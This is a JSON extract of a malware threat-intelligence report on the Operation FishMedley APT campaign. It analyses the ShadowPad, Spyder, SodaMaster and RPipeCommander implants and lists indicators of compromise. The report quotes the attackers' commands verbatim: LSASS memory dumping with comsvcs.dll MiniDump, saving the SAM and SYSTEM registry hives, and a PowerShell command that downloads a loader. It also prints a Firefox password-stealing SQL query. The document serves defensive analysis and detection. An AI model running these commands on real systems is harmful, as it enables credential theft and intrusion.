@@ -1,0 +1,262 @@
+[
+    {
+        "level": 0,
+        "content": "Operation FishMedley"
+    },
+    {
+        "level": 1,
+        "content": "Technical analysis Start"
+    },
+    {
+        "level": 2,
+        "content": "Technical analysis"
+    },
+    {
+        "level": 3,
+        "content": "Initial access"
+    },
+    {
+        "level": 5,
+        "content": "We were unable to identify the initial compromise vectors. For most cases, the attackers seemed to have had privileged access inside the local network, such as domain administrator credentials."
+    },
+    {
+        "level": 5,
+        "content": "At Victim D, the attackers gained access to an admin console and used it to deploy implants on other machines in the local network. It is probable that they first compromised the machine of a sysadmin or security analyst and then stole credentials that allowed them to connect to the console."
+    },
+    {
+        "level": 5,
+        "content": "At Victim F, the implants were delivered usingImpacket, which means that the attackers somehow previously compromised a high-privilege domain account."
+    },
+    {
+        "level": 3,
+        "content": "Lateral movement"
+    },
+    {
+        "level": 5,
+        "content": "At Victim F, the operators also used Impacket to move laterally. They gathered information on other local machines and installed implants."
+    },
+    {
+        "level": 5,
+        "content": "Table 3 shows that the operators first did some manual reconnaissance usingquser.exe,wmic.exe, andipconfig.exe. Then they tried to get credentials and other secrets bydumpingthe local security authority subsystem service (LSASS) process (PID 944). The PID of the process was obtained viatasklist /svcand the dump was performed usingcomsvcs.dll, which is a known living-off-the-land binary (LOLBIN). Note that it is likely that the attackers executedquser.exeto see whether other users or admins were also logged in, meaning privileged accesses were present in LSASS. According toMicrosoft documentation, to use this command the attacker must have Full Control permission or special access permission."
+    },
+    {
+        "level": 5,
+        "content": "They also saved the registry hivessam.hiveandsystem.hive, which can both contain secrets or credentials."
+    },
+    {
+        "level": 5,
+        "content": "Finally, they tried to dump the LSASS process again, using aforloop iterating over the output fromtasklist.exe. We have seen this same code used on other machines, so it is a good idea to block or at least alert on it."
+    },
+    {
+        "level": 5,
+        "content": "Table 3. Commands executed via Impacket on a machine at Victim F"
+    },
+    {
+        "level": 3,
+        "content": "Timestamp (UTC)Command2022-06-21 07:34:07quser2022-06-21 14:41:23wmic os get lastbootuptime2022-06-21 14:41:23ipconfig /all2022-06-21 14:41:23tasklist /svc2022-06-21 14:41:23C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c \"C:\\Windows\\System32\\rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 944 c:\\users\\public\\music\\temp.tmp full\"2022-06-21 14:41:23reg save hklm\\sam C:\\users\\public\\music\\sam.hive2022-06-21 14:41:23reg save hklm\\system C:\\users\\public\\music\\system.hive2022-06-21 14:41:23net user2022-06-22 07:05:37tasklist /v2022-06-22 07:07:33dir c:\\users2022-06-22 09:47:52for /f \"tokens=1,2 delims= \" ^%A in ('\"tasklist /fi \"Imagename eq lsass.exe\" | find \"lsass\"\"') do rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump ^%B \\Windows\\Temp\\YDWS6P.xml full"
+    },
+    {
+        "level": 3,
+        "content": "Toolset"
+    },
+    {
+        "level": 4,
+        "content": "ShadowPad"
+    },
+    {
+        "level": 5,
+        "content": "ShadowPad is a well-known and privately sold modular backdoor, known to only be supplied to China-aligned APT groups, includingFishMongerandSparklingGoblin, as documented bySentinelOne. In Operation FishMedley, the attackers used a ShadowPad version packed withScatterBee."
+    },
+    {
+        "level": 5,
+        "content": "At Victim D, the loader was downloaded using the following PowerShell command:"
+    },
+    {
+        "level": 5,
+        "content": "powershell (new-object System.Net.WebClient).DownloadFile(\"http://<victim’s_web_server_IP_address>/Images/menu/log.dll\";\"c:\\users\\public\\log.dll\")"
+    },
+    {
+        "level": 5,
+        "content": "This shows that the attackers compromised a web server at the victim’s organization to use it as a staging server for their malware."
+    },
+    {
+        "level": 5,
+        "content": "At Victim F, Firefox was used to download the loader, fromhttp://5.188.230[.]47/log.dll. We don’t know whether attackers had interactive access to the machine, whether another piece of malware was running in the Firefox process, or whether the victim was redirected to the download page, say via a watering-hole attack."
+    },
+    {
+        "level": 5,
+        "content": "log.dllis side-loaded by an old Bitdefender executable (original name:BDReinit.exe) and loads ShadowPad from a file namedlog.dll.dat, which can be decrypted using the scripts provided in PwC’sGitHubrepository."
+    },
+    {
+        "level": 5,
+        "content": "We did not recover thelog.dll.datfrom the victim’s machine, but we found a fake Adobe Flash installer onVirusTotalwith the identicallog.dllfile. The configuration of the ShadowPad payload is provided in Table 4."
+    },
+    {
+        "level": 5,
+        "content": "Table 4. ShadowPad configuration"
+    },
+    {
+        "level": 5,
+        "content": ""
+    },
+    {
+        "level": 5,
+        "content": ""
+    },
+    {
+        "level": 5,
+        "content": "Note that from March 20th, 2022 to November 2nd, 2022, the C&C domain resolved to213.59.118[.]124, which is mentioned in a VMwareblogpostabout ShadowPad."
+    },
+    {
+        "level": 4,
+        "content": "Spyder"
+    },
+    {
+        "level": 5,
+        "content": "At Victim D, we detected another backdoor typically used by FishMonger: Spyder, a modular implant that was analyzed in great detail byDr.Web."
+    },
+    {
+        "level": 5,
+        "content": "A Spyder loader was downloaded fromhttp://<a_victim’s_web_server_IP_address>/Images/menu/aa.docand dropped toC:\\Users\\Public\\task.exearound 18 hours after ShadowPad was installed."
+    },
+    {
+        "level": 5,
+        "content": "The loader – see Figure 2; reads the filec:\\windows\\temp\\guid.datand decrypts its contents using AES-CBC. The encryption key is hardcoded:F4 E4 C6 9E DE E0 9E 82 00 00 00 00 00 00 00 00. The initialization vector (IV) is the first eight bytes of the key. Unfortunately, we were unable to recover theguid.datfile."
+    },
+    {
+        "level": 5,
+        "content": "Then, the loader injects the decoded content – likely shellcode – into itself (task.exeprocess) as seen in Figure 3."
+    },
+    {
+        "level": 5,
+        "content": "Despite not obtaining the encrypted final payload, our product did detect a Spyder payload in memory and it was almost identical to the Spyder variant documented by Dr.Web. The C&C server was hardcoded to61.238.103[.]165."
+    },
+    {
+        "level": 5,
+        "content": "Interestingly, multiple subdomains ofjunlper[.]com, a known Spyder C&C domain and a weak homoglyph domain tojuniper.net, resolved to61.238.103[.]165in 2022."
+    },
+    {
+        "level": 5,
+        "content": "A self-signed TLS certificate was present on port 443 of the server from May to December 2022, with the thumbprint89EDCFFC66EDA3AEB75E140816702F9AC73A75F0. According toSentinelOne, it is a certificate used by FishMonger for its C&C servers."
+    },
+    {
+        "level": 4,
+        "content": "SodaMaster"
+    },
+    {
+        "level": 5,
+        "content": "SodaMaster is a backdoor that was documented byKasperskyin 2021. APT10 was the first group known to have access to this backdoor but Operation FishMedley indicates that it may now be shared among multiple China-aligned APT groups."
+    },
+    {
+        "level": 5,
+        "content": "SodaMaster can only be found decrypted in memory and that’s where we detected it. Even though we did not recover the full loading chain, we have identified a few samples that are the first step of the chain."
+    },
+    {
+        "level": 5,
+        "content": "We found six different malicious DLLs that are abusing legitimate executables viaDLL side-loading. They all implement the same decryption and injection routine."
+    },
+    {
+        "level": 5,
+        "content": "First, the loader reads a hardcoded file, for exampledebug.png, and XOR decrypts it using a hardcoded 239-byte key. Table 5 summarizes the different loaders. Note that the XOR key is also different in each sample, but too long to be included in the table. Also note that we did not recover any of these encrypted payloads."
+    },
+    {
+        "level": 5,
+        "content": "Table 5. SodaMaster loaders"
+    },
+    {
+        "level": 5,
+        "content": ""
+    },
+    {
+        "level": 5,
+        "content": ""
+    },
+    {
+        "level": 5,
+        "content": "Then, the decrypted buffer is injected into a newly created, suspendedsvchost.exeprocess – see Figure 4."
+    },
+    {
+        "level": 5,
+        "content": "Finally, the shellcode is executed using eitherCreateRemoteThread(on Windows XP or older versions) or, on newer Windows versions, viaNtCreateThreadExas shown in Figure 5."
+    },
+    {
+        "level": 5,
+        "content": "The last four loaders in Table 5 have additional features:"
+    },
+    {
+        "level": 5,
+        "content": "They have an export namedgetAllAuthDatathat implements a password stealer for Firefox. It reads the Firefox SQLite database and runs the querySELECT encryptedUsername, encryptedPassword, hostname,httpRealm FROM moz_logins. \nThe last three loaders persist as a service namedNetlock,MsKeyboardFiltersrv, anddownmap, respectively."
+    },
+    {
+        "level": 5,
+        "content": "As mentioned above, the SodaMaster payload was publicly analyzed by Kaspersky and the samples we’ve found don’t seem to have evolved much. They still implement the same four backdoor commands (d,f,l, ands) that were present in 2021."
+    },
+    {
+        "level": 5,
+        "content": "Table 6 shows the configurations from the four different SodaMaster payloads that we identified. Operators used a different C&C server per victim, but we can see that Victims B and C share the same hardcoded RSA key."
+    },
+    {
+        "level": 5,
+        "content": "Table 6. SodaMaster configuration"
+    },
+    {
+        "level": 4,
+        "content": "VictimC&C serverRSA keyB162.33.178[.]23MIGJAoGBAOPjO7DslhZvp0t8HNU/NWPIwstzwi61JlevD6TJtv/TZuN6CgXMCXql0P3CBGPVU5gAJiTxH0vslwdIpWeWEZZ5eJVk0VK9vA6XfCsc4NDVDPm7M5EH5sxHQjRNfe6H6RqcayAQn2YXd0Yua4S22F9ZmocU7VcPyLQLeVZoKjcxAgMBAAE=C78.141.202[.]70MIGJAoGBAOPjO7DslhZvp0t8HNU/NWPIwstzwi61JlevD6TJtv/TZuN6CgXMCXql0P3CBGPVU5gAJiTxH0vslwdIpWeWEZZ5eJVk0VK9vA6XfCsc4NDVDPm7M5EH5sxHQjRNfe6H6RqcayAQn2YXd0Yua4S22F9ZmocU7VcPyLQLeVZoKjcxAgMBAAE=F192.46.223[.]211MIGJAoGBAMYOg+eoTREKaAESDXt3Uh3Y4J84ObD1dfl3dOji0G24UlbHdjUk3e+/dtHjPsRZOfdLkwtz8SIZZVVt3pJGxgx9oyRtckJ6zsrYm/JIK+7bXikGf7sgs5zCItcaNJ1HFKoA9YQpfxXrwoHMCkaGb9NhsdsQ2k2q4jT68Hygzq19AgMBAAE=G168.100.10[.]136MIGJAoGBAJ0EsHDp5vtk23KCxEq0tAocvMwn63vCqq0FVmXsY+fvD0tP6Nlc7k0lESpB4wGioj2xuhQgcEjXEkYAIPGiefYFovxMPVuzp1FsutZa5SD6+4NcTRKsRsrMTZm5tFRuuENoEVmOSy3XoAS00mu4MM5tt7KKDlaczzhYJi21PGk5AgMBAAE="
+    },
+    {
+        "level": 4,
+        "content": "RPipeCommander"
+    },
+    {
+        "level": 5,
+        "content": "At Victim D, we captured a previously unknown implant in the same process where Spyder was running. It was probably loaded from disk or downloaded by Spyder. Because its DLL export name wasrcmd64.dll, we named this implant RPipeCommander."
+    },
+    {
+        "level": 5,
+        "content": "RPipeCommander is multithreaded and usesIoCompletionPortto manage the I/O requests of the multiple threads. It creates the named pipe\\\\.\\Pipe\\CmdPipe<PID>, where<PID>is the current process ID, and reads from and writes into this pipe."
+    },
+    {
+        "level": 5,
+        "content": "RPipeCommander is a reverse shell that accepts three commands via the named pipe:"
+    },
+    {
+        "level": 5,
+        "content": "h(0x68): create acmd.exeprocess and bind pipes to the process to send commands and read the output. \ni(0x69): Write a command in the existingcmd.exeprocess or read the output of the previous command. \nj(0x6A): exit thecmd.exeprocess by writingexit\\r\\nin the command shell."
+    },
+    {
+        "level": 5,
+        "content": "Note that it seems we only have the server side of RPipeCommander. It is likely that a second component, a client, is used to send commands to the server from another machine on the local network."
+    },
+    {
+        "level": 5,
+        "content": "Finally, RPipeCommander is written in C++ and RTTI information was included in the captured samples, allowing us to obtain some of the class names:"
+    },
+    {
+        "level": 5,
+        "content": "CPipeServer \nCPipeBuffer \nCPipeSrvEvent \nCPipeServerEventHandler"
+    },
+    {
+        "level": 4,
+        "content": "Other tools"
+    },
+    {
+        "level": 5,
+        "content": "In addition to the main implants described above, the attackers used a few additional tools to collect or exfiltrate data, which we describe in Table 7."
+    },
+    {
+        "level": 5,
+        "content": "Table 7. Other tools used during Operation FishMedley"
+    },
+    {
+        "level": 5,
+        "content": ""
+    },
+    {
+        "level": 5,
+        "content": ""
+    },
+    {
+        "level": 1,
+        "content": "Technical analysis Stop"
+    }
+]
